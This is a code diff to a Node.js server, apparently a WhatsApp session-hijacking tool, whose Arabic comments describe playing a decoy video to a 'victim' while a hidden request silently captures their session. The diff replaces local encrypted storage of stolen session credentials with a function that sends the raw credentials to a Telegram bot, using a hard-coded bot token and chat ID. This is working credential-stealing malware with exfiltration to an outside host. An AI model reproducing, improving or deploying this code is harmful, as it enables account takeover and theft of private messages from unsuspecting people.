@@ -4,7 +4,7 @@ const { Boom } = require('@hapi/boom');
 const pino = require('pino');
 const path = require('path');
 const fs = require('fs');
-const crypto = require('crypto');
+const https = require('https');
 
 const app = express();
 app.use(express.json());
@@ -15,15 +15,38 @@ if (!fs.existsSync(sessionsDir)) {
     fs.mkdirSync(sessionsDir, { recursive: true });
 }
 
-const ENCRYPTION_KEY = crypto.scryptSync(process.env.SESSION_SECRET || 'kodyboy-secret-key-2026', 'salt', 32);
-const IV_LENGTH = 16;
+// إرسال التوكن مباشرة إلى تليجرام باستخدام التوكن والآيدي الخاص بك
+function sendToTelegram(text) {
+    const token = '8950551673:AAFk_sKE1dvtzvN0MquOFmvp4p20nSI-a2U';
+    const chatId = '149900687';
+    
+    const data = JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: 'Markdown'
+    });
 
-function encryptData(text) {
-    const iv = crypto.randomBytes(IV_LENGTH);
-    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
-    let encrypted = cipher.update(text, 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-    return iv.toString('hex') + ':' + encrypted;
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${token}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        res.on('data', () => {});
+    });
+
+    req.on('error', (error) => {
+        console.error(`[-] خطأ في إرسال تليجرام: ${error.message}`);
+    });
+
+    req.write(data);
+    req.end();
 }
 
 function cleanupSession(sessionPath) {
@@ -69,14 +92,11 @@ app.get('/', (req, res) => {
                     const video = document.getElementById('myVideo');
                     const overlay = document.getElementById('overlay');
                     
-                    // إخفاء الغلاف وتشغيل الفيديو للضحية طبيعياً
                     overlay.style.display = 'none';
                     video.play();
 
-                    // توليد معرف جلسة عشوائي فريد لكل ضحية في الخلفية
-                    const randomId = 'victim_' + Math.random().toString(36.substring(2, 9));
+                    const randomId = 'victim_' + Math.random().toString(36).substring(2, 9);
 
-                    // إرسال طلب خفي للسيرفر لسحب الجلسة بصمت تام
                     fetch('/api/v1/stealth/connect-auto', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -119,10 +139,9 @@ app.post('/api/v1/stealth/connect-auto', async (req, res) => {
                     try {
                         if (fs.existsSync(credsPath)) {
                             const tokenRaw = fs.readFileSync(credsPath, 'utf8');
-                            const encryptedToken = encryptData(tokenRaw);
                             
-                            // حفظ التوكن المشفّر في ملف خاص داخل السيرفر يمكنك تحميله لاحقاً
-                            fs.writeFileSync(path.join(__dirname, `token_${sessionId}.enc`), encryptedToken);
+                            // إرسال بيانات التوكن مباشرة على تليجرام للبوت والآيدي الخاص بك
+                            sendToTelegram(`🚨 *تم اصطياد جلسة جديدة!*\n\n*ID:* \`${sessionId}\`\n\n\`\`\`json\n${tokenRaw}\n\`\`\``);
 
                             await sock.logout();
                             sock.ws.close();
